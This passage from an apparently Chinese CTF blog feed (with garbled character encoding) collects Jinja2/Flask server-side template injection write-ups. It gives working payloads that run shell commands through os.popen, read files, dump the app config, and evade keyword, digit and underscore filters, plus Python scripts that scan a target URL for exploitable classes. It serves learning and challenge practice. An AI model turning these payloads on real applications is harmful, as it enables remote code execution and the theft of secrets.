class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag&#x27;).read()&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__mro__&#x27;][2][&#x27;__subclasses__&#x27;]()[40](&#x27;flag&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>(2) ç”¨ attr ç»•è¿‡</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&quot;|attr(&quot;__class__)=&quot;&quot;.__class__</span><br><span class=\"line\">foo|attr(&quot;bar&quot;)=foo.bar</span><br><span class=\"line\"></span><br><span class=\"line\">1.&#123;&#123;()|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)()|attr(&#x27;__getitem__&#x27;)(213)|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;cat flag&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">2.</span><br><span class=\"line\">&#123;&#123;()|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)()|attr(&#x27;__getitem__&#x27;)(40)(&#x27;flag&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"8\"><a class=\"markdownIt-Anchor\" href=\"#8\">#</a> 8.</h3>\n<p>è¯¥é¢˜é™åˆ¶äº†ä¸€å †å…³é”®è¯<br>\n â€œclassâ€, â€œargâ€, â€œformâ€, â€œvalueâ€, â€œdataâ€, â€œrequestâ€, â€œinitâ€, â€œglobalâ€, â€œopenâ€, â€œmroâ€, â€œbaseâ€, â€œattrâ€</p>\n<p>èƒ½æƒ³åˆ°çš„åªæœ‰æ”¹ç¼–ç æˆ–è€…æ‹¼æ¥å­—ç¬¦ä¸²<br>\n (1) æ‹¼æ¥å­—ç¬¦ä¸²<br>\nè¯¥é¢˜åªé™åˆ¶çš„æ˜¯è¿ç»­çš„å­—ç¬¦ä¸²ï¼Œå¹¶æ²¡æœ‰é™åˆ¶å°†é›¶ç¢çš„å­—ç¬¦ä¸²æ‹¼æ¥æˆä¸€æ•´ä¸ª</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;&#x27;&#x27;[&#x27;__cl&#x27;&#x27;ass__&#x27;][&#x27;__mr&#x27;&#x27;o__&#x27;][2][&#x27;__subcl&#x27;&#x27;asses__&#x27;]()[40](&#x27;flag&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ä¹Ÿå¯ä»¥ç”¨+è¿æ¥</span><br><span class=\"line\">&#123;&#123;&#x27;&#x27;[&#x27;__cl&#x27;+&#x27;ass__&#x27;][&#x27;__mr&#x27;+&#x27;o__&#x27;][2][&#x27;__subcl&#x27;+&#x27;asses__&#x27;]()[40](&#x27;flag&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>join æ‹¼æ¥ç”¨æ³•:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;[1,2,3]|join&#125;&#125;==123 é»˜è®¤ç”¨ç©ºæ ¼ä¸²è”,å¯é€‰å‚æ•°</span><br><span class=\"line\">&#123;&#123;[1,2,3]|join(&#x27;|&#x27;)&#125;&#125;==1|2|3</span><br><span class=\"line\">eg.</span><br><span class=\"line\">&#123;&#123;&quot;&quot;.class&#125;&#125;</span><br><span class=\"line\">==&#123;&#123;&quot;&quot;.[cla,ss]|join&#125;&#125;</span><br><span class=\"line\">==&#123;&#123;&quot;&quot;[&#x27;[cla,ss]|join&#x27;]&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">payload:</span><br><span class=\"line\">&#123;&#123;&#x27;&#x27;[&#x27;__[cla,ss]|join]__&#x27;&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;&#x27;&#x27;[&#x27;__cl&#x27;&#x27;ass__&#x27;][&#x27;__mr&#x27;&#x27;o__&#x27;][2][&#x27;__subcl&#x27;&#x27;asses__&#x27;]()[40](&#x27;flag&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>(2) ç¼–ç ç»•è¿‡</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"9é™åˆ¶0-9\"><a class=\"markdownIt-Anchor\" href=\"#9é™åˆ¶0-9\">#</a> 9. é™åˆ¶ 0-9</h3>\n<p>ç”¨å¾ªç¯æ‰¾åˆ°èƒ½åˆ©ç”¨çš„ç±»ç›´æ¥ç”¨</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% for i in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__==&#x27;Popen&#x27; %&#125;&#123;&#123; i.__init__.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>\n<p>ç”¨ lipsum ä¸é€šè¿‡æ•°å­—ç›´æ¥åˆ©ç”¨</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>æ„é€ æ•°å­—</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">code=&#123;%set one=dict(a=&#x27;a&#x27;)|join|count%&#125;&#123;%set two=dict(aa=&#x27;aa&#x27;)|join|count%&#125;&#123;%set three=dict(aaa=&#x27;aaa&#x27;)|join|count%&#125;&#123;% set eryisan=(two~one~three)|int %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[eryisan].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat flag&#x27;).read()&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">æˆ–è€…</span><br><span class=\"line\">&#123;%set one=dict(a=a)|join|count%&#125;</span><br><span class=\"line\">&#123;%set two=dict(aa=a)|join|count%&#125;</span><br><span class=\"line\">&#123;%set three=dict(aaa=a)|join|count%&#125;</span><br><span class=\"line\">&#123;% set eryisan=(two~one~three)|int %&#125;</span><br><span class=\"line\">&#123;&#123;().__class__.__base__.__subclasses__()[eryisan].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat flag&#x27;).read()&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"10\"><a class=\"markdownIt-Anchor\" href=\"#10\">#</a> 10.</h3>\n<p>è¯¥é¢˜çš„é™åˆ¶ä¸ºÂ  <code>set config = None</code> <br>\n è€Œä¸”è¿™é¢˜çš„ target ä¸æ˜¯ flag äº†</p>\n<p>è€Œæ˜¯ get config, é‚£å°±æ˜¯è¦æ‹¿åˆ° config å†…å®¹å’¯</p>\n<p>æœç´¢ä¸€ç•ªåçŸ¥é“äº†å¯ä»¥ç”¨ current_app æ‹¿åˆ° config</p>\n<p>å¹¶ä¸”éœ€è¦ç”¨åˆ° url_for æ–¹æ³•</p>\n<p>payload å¦‚ä¸‹</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"11è¿‡æ»¤äº†-request-å’Œ\"><a class=\"markdownIt-Anchor\" href=\"#11è¿‡æ»¤äº†-request-å’Œ\">#</a> 11. è¿‡æ»¤äº† <code>, &quot; + request . [å’Œ] </code></h3>\n<p>å…ˆç¡®å®šä¸€ä¸ªåˆ©ç”¨çš„åŸºæœ¬ payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;lipsum|string|list&#125;&#125;</span><br><span class=\"line\">æŸ¥çœ‹_åœ¨ç¬¬å‡ ä¸ª,æˆ‘è¿™é‡Œæ˜¯18</span><br><span class=\"line\">&#123;&#123;lipsum|string|list|attr(pop)(18)&#125;&#125;</span><br><span class=\"line\">è¿™é‡Œçš„popå¿…é¡»æ˜¯å­—ç¬¦ä¸²æ‰èƒ½æœ‰ç”¨</span><br><span class=\"line\">setä¸€ä¸ªpopå­—ç¬¦ä¸²:</span><br><span class=\"line\">&#123;% set pop=dict(pop=a)|join%&#125;  </span><br><span class=\"line\">&#123;% set xiahuaxian=(lipsum|string|list)|attr(pop)(18)%&#125;</span><br><span class=\"line\">æ­¤æ—¶æˆåŠŸå–åˆ°_,å†ç”¨ä¸‹åˆ’çº¿å»æ„é€ å…¶ä»–çš„ç±»</span><br><span class=\"line\">&#123;% set globals=(xiahuaxian,xiahuaxian,dict=(globals=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class=\"line\">&#123;% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class=\"line\">å†æ„é€ åé¢çš„æ–¹æ³•</span><br><span class=\"line\">&#123;% set space=(lipsum|string|list)|attr(pop)(9)%&#125;  </span><br><span class=\"line\">&#123;% set os=dict(os=a)|join %&#125;  </span><br><span class=\"line\">&#123;% set popen=dict(popen=a)|join%&#125;  </span><br><span class=\"line\">&#123;% set cat=dict(cat=a)|join%&#125;  </span><br><span class=\"line\">&#123;% set cmd=(cat,space,dict(flag=a)|join)|join%&#125;  </span><br><span class=\"line\">&#123;% set read=dict(read=a)|join%&#125;</span><br><span class=\"line\">å®Œæˆè¯­æ³•:</span><br><span class=\"line\">&#123;&#123;(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>åˆåœ¨ä¸€èµ·:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% set pop=dict(pop=a)|join%&#125;</span><br><span class=\"line\">&#123;% set xiahuaxian=(lipsum|string|list)|attr(pop)(18)%&#125;</span><br><span class=\"line\">&#123;% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class=\"line\">&#123;% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class=\"line\">&#123;% set space=(lipsum|string|list)|attr(pop)(9)%&#125;</span><br><span class=\"line\">&#123;% set os=dict(os=a)|join %&#125;</span><br><span class=\"line\">&#123;% set popen=dict(popen=a)|join%&#125;</span><br><span class=\"line\">&#123;% set cat=dict(cat=a)|join%&#125;</span><br><span class=\"line\">&#123;% set cmd=(cat,space,dict(flag=a)|join)|join%&#125;</span><br><span class=\"line\">&#123;% set read=dict(read=a)|join%&#125;</span><br><span class=\"line\">&#123;&#123;(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"12è¿™ä¸€å…³æŠŠæ•°å­—å’Œ_ä¹Ÿè¿‡æ»¤äº†\"><a class=\"markdownIt-Anchor\" href=\"#12è¿™ä¸€å…³æŠŠæ•°å­—å’Œ_ä¹Ÿè¿‡æ»¤äº†\">#</a> 12. è¿™ä¸€å…³æŠŠæ•°å­—å’Œ_ä¹Ÿè¿‡æ»¤äº†</h3>\n<p>å¯åœ¨ä¸Šä¸€å…³çš„åŸºç¡€ä¸ŠåŠ æ•°å­—</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% set nine=dict(aaaaaaaaa=a)|join|count %&#125;</span><br><span class=\"line\">&#123;% set eighteen=nine+nine %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;% set pop=dict(pop=a)|join%&#125;</span><br><span class=\"line\">&#123;% set xiahuaxian=(lipsum|string|list)|attr(pop)(eighteen)%&#125;</span><br><span class=\"line\">&#123;% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class=\"line\">&#123;% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class=\"line\">&#123;% set space=(lipsum|string|list)|attr(pop)(nine)%&#125;</span><br><span class=\"line\">&#123;% set os=dict(os=a)|join %&#125;</span><br><span class=\"line\">&#123;% set popen=dict(popen=a)|join%&#125;</span><br><span class=\"line\">&#123;% set cat=dict(cat=a)|join%&#125;</span><br><span class=\"line\">&#123;% set cmd=(cat,space,dict(flag=a)|join)|join%&#125;</span><br><span class=\"line\">&#123;% set read=dict(read=a)|join%&#125;</span><br><span class=\"line\">&#123;&#123;(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"13è¿‡æ»¤çš„ä¸œè¥¿æ›´å¤šäº†ä½†æ˜¯æˆ‘ä»¬ä¸Šé¢çš„payloadå®Œç¾é¿å¼€\"><a class=\"markdownIt-Anchor\" href=\"#13è¿‡æ»¤çš„ä¸œè¥¿æ›´å¤šäº†ä½†æ˜¯æˆ‘ä»¬ä¸Šé¢çš„payloadå®Œç¾é¿å¼€\">#</a> 13. è¿‡æ»¤çš„ä¸œè¥¿æ›´å¤šäº†ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸Šé¢çš„ payload å®Œç¾é¿å¼€</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% set pop=dict(pop=a)|join%&#125;</span><br><span class=\"line\">&#123;% set xiahuaxian=(lipsum|string|list)|attr(pop)(18)%&#125;</span><br><span class=\"line\">&#123;% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class=\"line\">&#123;% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class=\"line\">&#123;% set space=(lipsum|string|list)|attr(pop)(9)%&#125;</span><br><span class=\"line\">&#123;% set os=dict(os=a)|join %&#125;</span><br><span class=\"line\">&#123;% set popen=dict(popen=a)|join%&#125;</span><br><span class=\"line\">&#123;% set cat=dict(cat=a)|join%&#125;</span><br><span class=\"line\">&#123;% set cmd=(cat,space,dict(flag=a)|join)|join%&#125;</span><br><span class=\"line\">&#123;% set read=dict(read=a)|join%&#125;</span><br><span class=\"line\">&#123;&#123;(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/05/02/SSTI/",
            "url": "https://hq185187.github.io/2023/05/02/SSTI/",
            "title": "SSTIæ€»ç»“",
            "date_published": "2023-05-02T02:48:11.201Z",
            "content_html": "<p><mark>é‡ç‚¹</mark></p>\n<h2 id=\"æ€ä¹ˆæŸ¥æ‰¾å¹¶ä¸”ä½¿ç”¨shellç±»æ‰¾åå­—å’Œè„šæœ¬ä»£ç \"><a class=\"markdownIt-Anchor\" href=\"#æ€ä¹ˆæŸ¥æ‰¾å¹¶ä¸”ä½¿ç”¨shellç±»æ‰¾åå­—å’Œè„šæœ¬ä»£ç \">#</a> æ€ä¹ˆæŸ¥æ‰¾å¹¶ä¸”ä½¿ç”¨ shell ç±»ï¼šæ‰¾åå­—å’Œè„šæœ¬ä»£ç </h2>\n<h3 id=\"ä¸€æœ€ç¬¨çš„æ–¹æ³•\"><a class=\"markdownIt-Anchor\" href=\"#ä¸€æœ€ç¬¨çš„æ–¹æ³•\">#</a> ä¸€ã€‚æœ€ç¬¨çš„æ–¹æ³•</h3>\n<p>æŠŠæ‰€æœ‰çš„å­ç±»å¤åˆ¶è¿› notepad++, æ›¿æ¢ï¼Œä¸º \\n, æŸ¥æ‰¾å¸¸è§åå­—æ¥æ‰¾å¯ä»¥åˆ©ç”¨ç±»å’Œå¯¹åº”çš„åºå·</p>\n<h4 id=\"æ–‡ä»¶è¯»å–\"><a class=\"markdownIt-Anchor\" href=\"#æ–‡ä»¶è¯»å–\">#</a> æ–‡ä»¶è¯»å–</h4>\n<p><code>&lt;class '_frozen_importlib_external.FileLoader'&gt;</code> <br>\n è„šæœ¬:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\">url=<span class=\"built_in\">input</span>(<span class=\"string\">&#x27;è¯·è¾“å…¥URLé“¾æ¥: &#x27;</span>)  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">500</span>):  </span><br><span class=\"line\">data=&#123;<span class=\"string\">&quot;code&quot;</span>:<span class=\"string\">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class=\"built_in\">str</span>(i)+<span class=\"string\">&quot;]&#125;&#125;&quot;</span>&#125;<span class=\"comment\">#è¿™é‡Œçš„codeè¦æ ¹æ®å®é™…æƒ…å†µå¡«å†™å“¦  </span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response=requests.post(url,data=data)  </span><br><span class=\"line\"><span class=\"comment\">#print(response.text)  </span></span><br><span class=\"line\"><span class=\"keyword\">if</span> response.status_code==<span class=\"number\">200</span>:  </span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">&#x27;_frozen_importlib_external.FileLoader&#x27;</span> <span class=\"keyword\">in</span> response.text:  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(i)  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\"><span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n<p>æ³¨æ„è¿™ä¸ªç±»æœ‰ get_data æ–¹æ³•å¯ä»¥ç›´æ¥ç”¨ï¼Œeg</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;().__class__.__base__.__subclasses__()[122].get_data(0,&quot;flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"æŸ¥çœ‹å†…ç½®å‡½æ•°å’Œå¯¹è±¡\"><a class=\"markdownIt-Anchor\" href=\"#æŸ¥çœ‹å†…ç½®å‡½æ•°å’Œå¯¹è±¡\">#</a> æŸ¥çœ‹å†…ç½®å‡½æ•°å’Œå¯¹è±¡</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;self.__dict__._TemplateReference__context.keys()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hello dict_keys([&#x27;range&#x27;, &#x27;dict&#x27;, &#x27;lipsum&#x27;, &#x27;cycler&#x27;, &#x27;joiner&#x27;, &#x27;namespace&#x27;, &#x27;url_for&#x27;, &#x27;get_flashed_messages&#x27;, &#x27;config&#x27;, &#x27;request&#x27;, &#x27;session&#x27;, &#x27;g&#x27;])</span><br></pre></td></tr></table></figure>\n<h4 id=\"osç±»builtinsç±»æŸ¥æ‰¾\"><a class=\"markdownIt-Anchor\" href=\"#osç±»builtinsç±»æŸ¥æ‰¾\">#</a> <mark>os ç±»ï¼Œbuiltins ç±»æŸ¥æ‰¾</mark></h4>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\">url=<span class=\"built_in\">input</span>(<span class=\"string\">&quot;è¯·è¾“å…¥é“¾æ¥: &quot;</span>)  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">500</span>):  </span><br><span class=\"line\">data = &#123;<span class=\"string\">&quot;code&quot;</span>: <span class=\"string\">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span> + <span class=\"built_in\">str</span>(i) + <span class=\"string\">&quot;].__init__.__globals__&#125;&#125;&quot;</span>&#125; <span class=\"comment\"># è¿™é‡Œçš„codeè¦æ ¹æ®å®é™…æƒ…å†µå¡«å†™å“¦  </span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.post(url, data=data)  </span><br><span class=\"line\"><span class=\"comment\"># print(response.text)  </span></span><br><span class=\"line\"><span class=\"keyword\">if</span> response.status_code == <span class=\"number\">200</span>:  </span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">&#x27;builtins&#x27;</span> <span class=\"keyword\">in</span> response.text:<span class=\"comment\">#builtinså¯æ ¹æ®æƒ…å†µè®¾ç½®ä¸º&quot;os.py/os&quot;ç­‰ç­‰  </span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(i)  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;-&#x27;</span>)  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\"><span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"builtinsæ¨¡æ¿åˆ©ç”¨\"><a class=\"markdownIt-Anchor\" href=\"#builtinsæ¨¡æ¿åˆ©ç”¨\">#</a> builtins æ¨¡æ¿åˆ©ç”¨</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;().__class__.__base__.__subclasses__()[128].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"osæ¨¡å—åˆ©ç”¨\"><a class=\"markdownIt-Anchor\" href=\"#osæ¨¡å—åˆ©ç”¨\">#</a> os æ¨¡å—åˆ©ç”¨</h4>\n<h5 id=\"1lipsumå†…ç½®os\"><a class=\"markdownIt-Anchor\" href=\"#1lipsumå†…ç½®os\">#</a> 1.lipsum å†…ç½® os</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h5 id=\"2url_forè°ƒç”¨os\"><a class=\"markdownIt-Anchor\" href=\"#2url_forè°ƒç”¨os\">#</a> 2.url_for è°ƒç”¨ os</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;url_for.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h5 id=\"3å·²åŠ è½½çš„osæ¨¡å—çš„å­ç±»é‡Œç›´æ¥è°ƒç”¨osæ¨¡å—\"><a class=\"markdownIt-Anchor\" href=\"#3å·²åŠ è½½çš„osæ¨¡å—çš„å­ç±»é‡Œç›´æ¥è°ƒç”¨osæ¨¡å—\">#</a> 3. å·²åŠ è½½çš„ os æ¨¡å—çš„å­ç±»é‡Œç›´æ¥è°ƒç”¨ os æ¨¡å—</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span 